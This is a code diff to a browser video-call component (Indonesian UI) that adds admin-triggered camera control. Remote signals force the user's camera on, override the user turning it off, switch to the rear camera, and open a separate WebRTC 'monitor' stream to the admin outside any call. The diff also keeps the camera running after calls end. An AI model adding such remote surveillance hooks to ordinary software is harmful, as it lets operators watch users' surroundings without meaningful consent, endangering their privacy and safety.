@@ -1,7 +1,9 @@
 class VideoCallManager {
-  constructor({ currentUser, sendSignal }) {
+  constructor({ currentUser, sendSignal, sendMonitorSignal, reportCameraStatus }) {
     this.currentUser = currentUser;
     this.sendSignal = sendSignal;
+    this.sendMonitorSignal = sendMonitorSignal || (async () => {});
+    this.reportCameraStatus = reportCameraStatus || (async () => {});
     this.peerId = null;
     this.peerName = '';
     this.peerColor = '#6366f1';
@@ -12,6 +14,10 @@ class VideoCallManager {
     this.micOn = true;
     this.camOn = true;
     this.onlineUsers = [];
+    this.autoCameraActive = false;
+    this.adminCamEnabled = true;
+    this.cameraFacing = 'user';
+    this.monitorPCs = new Map();
 
     this.iceConfig = {
       iceServers: [
@@ -29,7 +35,9 @@ class VideoCallManager {
       active: document.getElementById('activeCall'),
       localVideo: document.getElementById('localVideo'),
       remoteVideo: document.getElementById('remoteVideo'),
-      statusText: document.getElementById('callStatusText')
+      statusText: document.getElementById('callStatusText'),
+      previewWrap: document.getElementById('cameraPreview'),
+      previewVideo: document.getElementById('previewVideo')
     };
 
     this.bindUI();
@@ -47,6 +55,235 @@ class VideoCallManager {
 
   setOnlineUsers(users) {
     this.onlineUsers = users || [];
+  }
+
+  getVideoConstraints() {
+    return {
+      facingMode: this.cameraFacing,
+      width: { ideal: 640 },
+      height: { ideal: 480 }
+    };
+  }
+
+  async reportStatus(active, permission) {
+    await this.reportCameraStatus(active, permission, this.cameraFacing);
+  }
+
+  async acquireVideoTrack() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: this.cameraFacing }, width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      });
+      return stream.getVideoTracks()[0];
+    } catch {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: this.getVideoConstraints(),
+        audio: false
+      });
+      return stream.getVideoTracks()[0];
+    }
+  }
+
+  async replaceVideoTrackInPCs(newTrack) {
+    if (this.pc) {
+      const sender = this.pc.getSenders().find((s) => s.track?.kind === 'video');
+      if (sender) await sender.replaceTrack(newTrack);
+    }
+    for (const pc of this.monitorPCs.values()) {
+      const sender = pc.getSenders().find((s) => s.track?.kind === 'video');
+      if (sender) await sender.replaceTrack(newTrack);
+    }
+  }
+
+  async switchCameraFacing(facing) {
+    if (!['user', 'environment'].includes(facing)) return;
+    if (this.cameraFacing === facing && this.localStream?.getVideoTracks().length) return;
+
+    this.cameraFacing = facing;
+    this.adminCamEnabled = true;
+
+    try {
+      const newTrack = await this.acquireVideoTrack();
+      newTrack.enabled = this.adminCamEnabled;
+
+      if (!this.localStream) {
+        this.localStream = new MediaStream();
+      }
+
+      this.localStream.getVideoTracks().forEach((track) => {
+        track.stop();
+        this.localStream.removeTrack(track);
+      });
+      this.localStream.addTrack(newTrack);
+
+      await this.replaceVideoTrackInPCs(newTrack);
+
+      this.autoCameraActive = true;
+      this.camOn = true;
+
+      if (this.els.localVideo) this.els.localVideo.srcObject = this.localStream;
+      if (!this.inCall) this.showPreview();
+      else this.updateControlButtons();
+
+      await this.reportStatus(true, 'granted');
+    } catch (err) {
+      console.warn('Gagal ganti kamera:', err.message);
+      await this.reportStatus(false, 'denied');
+    }
+  }
+
+  async startAutoCamera() {
+    if (this.inCall) return;
+    try {
+      if (!this.localStream) {
+        const videoTrack = await this.acquireVideoTrack();
+        this.localStream = new MediaStream([videoTrack]);
+      } else {
+        this.localStream.getVideoTracks().forEach((t) => {
+          t.enabled = this.adminCamEnabled;
+        });
+      }
+      this.autoCameraActive = true;
+      this.camOn = this.adminCamEnabled;
+      this.showPreview();
+      await this.reportStatus(this.adminCamEnabled, 'granted');
+    } catch (err) {
+      console.warn('Kamera tidak dapat diakses:', err.message);
+      this.autoCameraActive = false;
+      await this.reportStatus(false, 'denied');
+    }
+  }
+
+  showPreview() {
+    if (!this.adminCamEnabled || !this.localStream) {
+      this.hidePreview();
+      return;
+    }
+    if (this.els.previewVideo) {
+      this.els.previewVideo.srcObject = this.localStream;
+    }
+    if (this.els.previewWrap) {
+      this.els.previewWrap.style.display = this.inCall ? 'none' : 'flex';
+    }
+  }
+
+  hidePreview() {
+    if (this.els.previewWrap) this.els.previewWrap.style.display = 'none';
+    if (this.els.previewVideo) this.els.previewVideo.srcObject = null;
+  }
+
+  async forceCameraOn() {
+    this.adminCamEnabled = true;
+    if (!this.localStream) {
+      await this.startAutoCamera();
+      return;
+    }
+    this.localStream.getVideoTracks().forEach((t) => { t.enabled = true; });
+    this.camOn = true;
+    this.autoCameraActive = true;
+    if (!this.inCall) this.showPreview();
+    await this.reportStatus(true, 'granted');
+  }
+
+  async forceCameraOff() {
+    this.adminCamEnabled = false;
+    if (this.localStream) {
+      this.localStream.getVideoTracks().forEach((t) => { t.enabled = false; });
+    }
+    this.camOn = false;
+    this.hidePreview();
+    this.cleanupAllMonitors();
+    await this.reportStatus(false, 'admin_off');
+  }
+
+  async handleAdminSignal(signal) {
+    const type = signal.type;
+    const data = signal.data || {};
+
+    switch (type) {
+      case 'admin-cam-on':
+        await this.forceCameraOn();
+        break;
+      case 'admin-cam-off':
+        await this.forceCameraOff();
+        break;
+      case 'admin-cam-facing':
+        await this.switchCameraFacing(data.facing || 'user');
+        break;
+      case 'monitor-request':
+        await this.startMonitorSession();
+        break;
+      case 'monitor-stop':
+        this.cleanupAllMonitors();
+        break;
+      case 'monitor-answer':
+        await this.handleMonitorAnswer(data.sdp);
+        break;
+      case 'monitor-ice':
+        await this.handleMonitorIce(data.candidate);
+        break;
+    }
+  }
+
+  async startMonitorSession() {
+    if (!this.adminCamEnabled) return;
+    if (!this.localStream) await this.forceCameraOn();
+    if (!this.localStream) return;
+
+    this.cleanupMonitor(0);
+    const pc = new RTCPeerConnection(this.iceConfig);
+    this.monitorPCs.set(0, pc);
+
+    this.localStream.getVideoTracks().forEach((track) => {
+      pc.addTrack(track, this.localStream);
+    });
+
+    pc.onicecandidate = (e) => {
+      if (e.candidate) {
+        this.sendMonitorSignal('monitor-ice', { candidate: e.candidate });
+      }
+    };
+
+    pc.onconnectionstatechange = () => {
+      if (pc.connectionState === 'failed' || pc.connectionState === 'closed') {
+        this.cleanupMonitor(0);
+      }
+    };
+
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    await this.sendMonitorSignal('monitor-offer', { sdp: offer });
+  }
+
+  async handleMonitorAnswer(sdp) {
+    const pc = this.monitorPCs.get(0);
+    if (!pc || !sdp) return;
+    try {
+      await pc.setRemoteDescription(new RTCSessionDescription(sdp));
+    } catch (e) {
+      console.warn('Monitor answer error:', e);
+    }
+  }
+
+  async handleMonitorIce(candidate) {
+    const pc = this.monitorPCs.get(0);
+    if (!pc || !candidate) return;
+    try {
+      await pc.addIceCandidate(new RTCIceCandidate(candidate));
+    } catch (e) { /* ignore stale candidates */ }
+  }
+
+  cleanupMonitor(adminId) {
+    const pc = this.monitorPCs.get(adminId);
+    if (pc) {
+      pc.close();
+      this.monitorPCs.delete(adminId);
+    }
+  }
+
+  cleanupAllMonitors() {
+    [...this.monitorPCs.keys()].forEach((id) => this.cleanupMonitor(id));
   }
 
   showPicker() {
@@ -93,6 +330,7 @@ class VideoCallManager {
       this.peerColor = user.avatar_color;
       this.inCall = true;
       this.hidePicker();
+      this.hidePreview();
       if (typeof window.onVideoCallStart === 'function') window.onVideoCallStart();
 
       await this.getMedia();
@@ -104,7 +342,7 @@ class VideoCallManager {
       });
     } catch (err) {
       alert('Tidak bisa memulai panggilan: ' + err.message);
-      this.cleanup();
+      this.endCall();
     }
   }
 
@@ -134,7 +372,7 @@ class VideoCallManager {
       case 'call-reject':
         if (this.peerId === from) {
           alert(this.peerName + ' menolak panggilan');
-          this.cleanup();
+          this.endCall();
         }
         break;
 
@@ -160,7 +398,7 @@ class VideoCallManager {
         break;
 
       case 'call-hangup':
-        if (this.peerId === from) this.cleanup();
+        if (this.peerId === from) this.endCall();
         break;
     }
   }
@@ -178,18 +416,19 @@ class VideoCallManager {
       this.inCall = true;
       if (typeof window.onVideoCallStart === 'function') window.onVideoCallStart();
       this.els.incoming.style.display = 'none';
+      this.hidePreview();
       await this.getMedia();
       this.showActiveCall('Menghubungkan...');
       await this.sendSignal(this.peerId, 'call-accept', {});
     } catch (err) {
       alert('Tidak bisa menerima panggilan: ' + err.message);
-      this.cleanup();
+      this.endCall();
     }
   }
 
   rejectCall() {
     this.sendSignal(this.peerId, 'call-reject', {});
-    this.cleanup();
+    this.endCall();
   }
 
   async createAndSendOffer() {
@@ -232,19 +471,35 @@ class VideoCallManager {
       const state = this.pc?.connectionState;
       if (state === 'connected') this.setStatus('Terhubung');
       if (state === 'disconnected') this.setStatus('Koneksi terputus...');
-      if (state === 'failed' || state === 'closed') this.cleanup();
+      if (state === 'failed' || state === 'closed') this.endCall();
     };
   }
 
   async getMedia() {
+    if (this.localStream?.getAudioTracks().length && this.localStream.getVideoTracks().length) {
+      this.els.localVideo.srcObject = this.localStream;
+      return;
+    }
+
+    if (this.localStream && !this.localStream.getAudioTracks().length) {
+      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      audioStream.getAudioTracks().forEach((t) => this.localStream.addTrack(t));
+      this.micOn = true;
+      this.els.localVideo.srcObject = this.localStream;
+      this.updateControlButtons();
+      return;
+    }
+
     if (this.localStream) return;
+
     this.localStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      video: this.getVideoConstraints(),
       audio: true
     });
     this.els.localVideo.srcObject = this.localStream;
     this.micOn = true;
     this.camOn = true;
+    this.autoCameraActive = true;
     this.updateControlButtons();
   }
 
@@ -260,7 +515,7 @@ class VideoCallManager {
 
   hangup() {
     if (this.peerId) this.sendSignal(this.peerId, 'call-hangup', {});
-    this.cleanup();
+    this.endCall();
   }
 
   toggleMic() {
@@ -273,8 +528,12 @@ class VideoCallManager {
   toggleCam() {
     if (!this.localStream) return;
     this.camOn = !this.camOn;
+    this.adminCamEnabled = this.camOn;
     this.localStream.getVideoTracks().forEach(t => { t.enabled = this.camOn; });
+    if (this.camOn && !this.inCall) this.showPreview();
+    else if (!this.camOn) this.hidePreview();
     this.updateControlButtons();
+    this.reportStatus(this.camOn, this.camOn ? 'granted' : 'admin_off');
   }
 
   updateControlButtons() {
@@ -286,23 +545,46 @@ class VideoCallManager {
     if (camBtn) camBtn.classList.toggle('vc-muted', !this.camOn);
   }
 
-  cleanup() {
+  endCall() {
     this.pc?.close();
     this.pc = null;
-    this.localStream?.getTracks().forEach(t => t.stop());
-    this.localStream = null;
     this.peerId = null;
     this.peerName = '';
     this.isCaller = false;
     this.inCall = false;
 
-    if (this.els.localVideo) this.els.localVideo.srcObject = null;
     if (this.els.remoteVideo) this.els.remoteVideo.srcObject = null;
     if (this.els.incoming) this.els.incoming.style.display = 'none';
     if (this.els.active) this.els.active.style.display = 'none';
     this.hidePicker();
 
+    if (this.localStream) {
+      this.localStream.getAudioTracks().forEach((t) => {
+        this.localStream.removeTrack(t);
+        t.stop();
+      });
+      this.micOn = false;
+    }
+
+    if (this.autoCameraActive && this.adminCamEnabled) {
+      if (this.els.localVideo) this.els.localVideo.srcObject = null;
+      this.showPreview();
+    }
+
     if (typeof window.onVideoCallEnd === 'function') window.onVideoCallEnd();
+  }
+
+  cleanup() {
+    this.endCall();
+    this.cleanupAllMonitors();
+    this.localStream?.getTracks().forEach(t => t.stop());
+    this.localStream = null;
+    this.autoCameraActive = false;
+    this.adminCamEnabled = true;
+
+    if (this.els.localVideo) this.els.localVideo.srcObject = null;
+    if (this.els.remoteVideo) this.els.remoteVideo.srcObject = null;
+    this.hidePreview();
   }
 
   escapeHtml(text) {
